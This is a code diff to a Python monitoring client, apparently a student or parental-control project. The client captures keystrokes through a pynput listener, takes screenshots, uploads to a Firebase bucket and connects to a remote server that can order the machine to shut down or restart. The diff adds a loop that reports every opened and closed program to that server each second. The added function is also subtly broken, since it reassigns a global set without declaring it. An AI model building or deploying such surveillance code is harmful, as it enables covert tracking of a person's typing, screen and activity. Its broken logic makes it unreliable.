@@ -2,17 +2,21 @@ from pynput.keyboard import Listener
 import socket
 import pyautogui
 from datetime import datetime
+import time
 import os
+import psutil
 import firebase_admin
 from firebase_admin import credentials, storage
+
 cred = credentials.Certificate("credentials.json")
 firebase_admin.initialize_app(cred, {"storageBucket": "pbl4-09092003.appspot.com"})
 
 
 clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 serverParent = '192.168.1.10'
 serverPort = 8080
+current_apps = set()
+
 try:
     clientSocket.connect((serverParent, serverPort))
 except Exception as e:
@@ -60,7 +64,28 @@ def takeScreenshot():
     except Exception as e:
         print("Error: " + str(e))
 
-    
+def getAppHistory():
+    while True:
+        # Lấy danh sách các ứng dụng đang chạy
+        running_apps = {process.name() for process in psutil.process_iter() if process.name().endswith('.exe')}
+        
+        new_apps = running_apps - current_apps
+        closed_apps = current_apps - running_apps
+        
+        for app in new_apps:
+            # print(f"New App: {app}")
+            app_new = "New App: {}".format(app)
+            clientSocket.send(app_new.encode('utf-8'))
+        
+        for app in closed_apps:
+            # print(f"Closed App: {app}")
+            app_close = "Closed App: {}".format(app)
+            clientSocket.send(app_close.encode('utf-8'))
+        
+        current_apps = running_apps
+        
+        time.sleep(1)
+        
 with Listener(on_press=on_press) as parent:
     try:
         while True:
@@ -68,10 +93,13 @@ with Listener(on_press=on_press) as parent:
             print("Message:" + message)
             if message == 'takeScreenshot':
                 takeScreenshot()
+            elif message == 'getAppHistory':
+                getAppHistory()
             elif message == 'shutdown':
                 os.system("shutdown /s /t 1")
             elif message == 'restart':
                 os.system("shutdown /r /t 1")
+
     except Exception as e:
         print("Error: " + str(e))
     finally:
